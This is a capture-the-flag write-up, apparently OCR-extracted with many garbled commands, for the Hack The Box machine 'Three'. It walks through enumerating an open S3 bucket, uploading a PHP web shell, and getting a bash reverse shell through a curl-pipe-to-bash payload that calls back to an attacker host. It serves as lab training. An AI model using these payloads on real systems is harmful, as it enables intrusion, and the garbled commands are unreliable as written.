<p>Three Write-up
Prepared by: dotguy
Introduction
Organizations of every type, size, and industry are using the cloud for a wide variety of use cases, such as
data backup, storage, disaster recovery, email, virtual desktops, software development and testing, etc.
Thus, it is crucial to have a secure configuration for a company’s cloud infrastructure in order to protect
against any attacks. Three is a Linux box that includes a website, which utilizes an AWS $3 bucket as its
cloud-storage device. We can exploit this poorly configured $3 bucket and upload a reverse shell on it. We
can then visit the corresponding URL to execute the reverse file and ultimately retrieve the flag.
Note: Please allow the machine a few minutes to properly boot up after spawning as localstack
needs a few minutes to load.
Enumeration
To start with, we will check for open ports using a Nmap scan:
sudo nmap -sV 10.129.227.248
…
sudo nmap -sV 10. 129.227.248
Nmap scan report for thetoppers. htb (10.129.227.248)
Host is up (0.21s latency).
PORT
STATE SERVICE VERSION
22/tcp open ssh
OpenSSH 7.6p1 Ubuntu 4ubuntu0. 7 (Ubuntu Linux; protocol 2.0)
80/tcp open http
Apache httpd 2.4.29 ( (Ubuntu) )
The scan shows that two ports are open - port 80 (HTTP) and port 22 (SSH). Let’s enumerate port 80
using our web browser.

THE BAND
We love music
We “The Toppers” are a group of five young men who truly believe that music can be pure art. We play a wide range of
music and we love to interact with people during our performances. The concert will be the loudest, the most beautiful
and the best! We know how to make
vent into a festival! All of us have been performing together for over several
years now, but still there is always something new to try. With the best musicians aside, we make any event into a
festival.
Music is an art that needs talent and materials. You can’t bring the best artists and music instruments into an event
without any preparation. Aside from this, we know how to collaborate with the best artists to create a memorable
moment for your special day. All the facts are here
you can read about us and the band for making your events into a
festival.No matter what celebration you’re hosting demands, we have the right ensemble to get the party started. Our
full-service music bands can add to the fun at any gathering. from proms and school dances to weddings. We’ve
performed at so many live concerts, college events, and private parties, you might not want to stop them from playing!

We can see a static webpage that features a concert ticket booking section but it isn’t functional. Let’s
further try to identify the technology stack of the website using a browser extension known as Wappalyzer.
It can be installed on the supported browsers from here.
Once the Wappalyzer extension is installed, we can visit the website and then click on the extension icon to

Let’s add an entry for thetoppers. htb in the /etc/hosts file with the corresponding IP address to be able
to access this domain in our browser.
The /etc/hosts file is used to resolve a hostname into an IP address. By default, the /etc/hosts file is
queried before the DNS server for hostname resolution thus we will need to add an entry in the
/etc/hosts file for this domain to enable the browser to resolve the address for thetoppers . htb.
echo “10.129.227.248 thetoppers. htb” | sudo tee -a /etc/hosts
Sub-domain enumeration
What is a subdomain?
A subdomain name is a piece of additional information added to the beginning of a website’s domain name.
It allows websites to separate and organize content for a specific function - such as a blog or an online
store - from the rest of your website.
For example, if we visit hackthebox.com we can access the main website. Or, we can visit
ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the
subdomain, hackthebox is the primary domain and com is the top-level domain (TLD). Although the URL
changes slightly, you’re still on HTB’s website, under HTB’s domain.
Often, different subdomains will have different IP addresses, so when our system goes to look up the
subdomain, it gets the address of the server that handles that application. It is also possible to have one
server handle multiple subdomains. This is accomplished via “host-based routing”, or “virtual host routing”,
where the server uses the Host header in the HTTP request to determine which application is meant to
handle the request.
As we have the domain thetoppers. htb, let us enumerate for any other sub-domains that may be present
on the same server. There are different enumeration tools available for this purpose like gobuster , wfuzz ,
feroxbuster etc. As of this writeup, we will be using gobuster for sub-domain enumeration using the
following command.
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000. txt -u
<a href="http://thetoppers.htb">http://thetoppers.htb</a>
We will be using the following flags for gobuster .
vhost : Uses VHOST for brute-forcing
-W
: Path to the wordlist
-1
: Specify the URL
gobuster will send out requests with a host header that looks like the following for each word in the
wordlist:
Host: [word] . thetoppers. htb
It will note the default response, and show any that return something different.
…

Found: $3. thetoppers. htb (Status: 404) [Size: 21]
[** SNIP ** ]
The gobuster result shows that there exists a sub-domain called s3. thetoppers. htb. Let’s also add an
entry for this sub-domain in the /etc/hosts file.
echo “10. 129.227.248 s3. thetoppers.htb” | sudo tee -a /etc/hosts
After we have added an entry for the domain to our hosts file let’s visit s3. thetoppers . htb using a
browser.
O &#x26; $3.thetoppers.htb
(“status”: “running”}
The webpage only contains the following JSON.
(“status”: “running”}
Note: If instead of JSON you get a Proxy Error, give the box a few minutes to
properly boot.
What is an $3 bucket?
A quick Google search containing the keywords “s3 subdomain status running” returns this result stating
that s3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS
S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static
Website etc. The files stored in the Amazon $3 bucket are called $3 objects.
We can interact with this $3 bucket with the aid of the awscli utility. It can be installed on Linux using the
command apt install awscli .
First, we need to configure it using the following command.
aws configure
We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check
authentication (still, it must be configured to something for aws to work).
aws configure
AWS Access Key ID [None] : temp
AWS Secret Access Key [None] : temp
Default region name [None] : temp
Default output format [None] : temp
We can list all of the $3 buckets hosted by the server by using the Is command.
aws —endpoint=<a href="http://s3">http://s3</a>. thetoppers .htb s3 1s
aws —endpoint=http: / /s3. thetoppers . htb s3 Is
2022-07-21 18:35:09 thetoppers . htb
We can also use the Is command to list objects and common prefixes under the specified bucket.
aws —endpoint=<a href="http://s3">http://s3</a>. thetoppers.htb s3 Is s3:/ /thetoppers.htb
…
aws —endpoint=http://$3. thetoppers. htb s3 Is s3://thetoppers. htb

11952 index . php
We see the files index.php, . htaccess and a directory called images in the specified bucket. It seems like
this is the webroot of the website running on port 80 . So the Apache server is using this $3 bucket as
storage.
awscli has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the s3 bucket and since it’s uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.
We can use the following PHP one-liner which uses the system( ) function which takes the URL parameter
emd as an input and executes it as a system command.</p>
<!--?php system($_GET\[ "cmd" \]) ; ?-->
<p>Let’s create a PHP file to upload.
echo ’<!--?php system( $_GET\[ "cmd" \]) ; ?--> > shell.php
Then, we can upload this PHP shell to the thetoppers. htb $3 bucket using the following command.
aws —endpoint=http: //s3. thetoppers .htb s3 cp shell.php s3:/ /thetoppers.htb
…
aws —endpoint=<a href="http://s3">http://s3</a>. thetoppers. htb s3 cp shell . php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers. htb/shell.php
We can confirm that our shell is uploaded by navigating to <a href="http://thetoppers.htb/shell.php">http://thetoppers.htb/shell.php</a>. Let us try
executing the OS command id using the URL parameter cmd.
<a href="http://thetoppers">http://thetoppers</a>. htb/shell. php?cmd=id
Q <a href="http://thetoppers.htb/shell.php?cmd=id">http://thetoppers.htb/shell.php?cmd=id</a>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
The response from the server contains the output of the OS command id, which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine’s IP address on
the specified listening port. We can obtain the tuno IP address of our local machine using the following
command.
ifconfig
…
ifconfig

[** SNIP **]
Let’s get a reverse shell by creating a new file shell. sh containing the following bash reverse shell payload
which will connect back to our local machine on port 1337 .
#1/bin/bash
bash -i >&#x26; /dev/tcp/&#x3C;YOUR_IP_ADDRESS>/1337 0>&#x26;1
We will start a neat listener on our local port 1337 using the following command.
nc -nvip 1337
nc -nvip 1337
Ncat: Version 7.92 ( https :/ /nmap. org/ncat )
Ncat: Listening on : : :1337
Ncat: Listening on 0.0.0.0:1337
Let’s start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here
that this command for hosting the web server must be run from the directory which contains the reverse
shell file. So, we must first traverse to the appropriate directory and then run the following command.
python3 -m http. server 8000
python3 -m http. server 8000
Serving HTTP on 0.0.0.0 port 8000 (<a href="http://0.0.0.0:8000/">http://0.0.0.0:8000/</a> ) …
We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
in order to execute it. Thus, let us visit the following URL containing the payload in the browser.
<a href="http://thetoppers">http://thetoppers</a>. htb/shell. php?cmd=curl$20&#x3C;YOUR_IP_ADDRESS>: 8000/shell. sh | bash
We receive a reverse shell on the corresponding listening port.
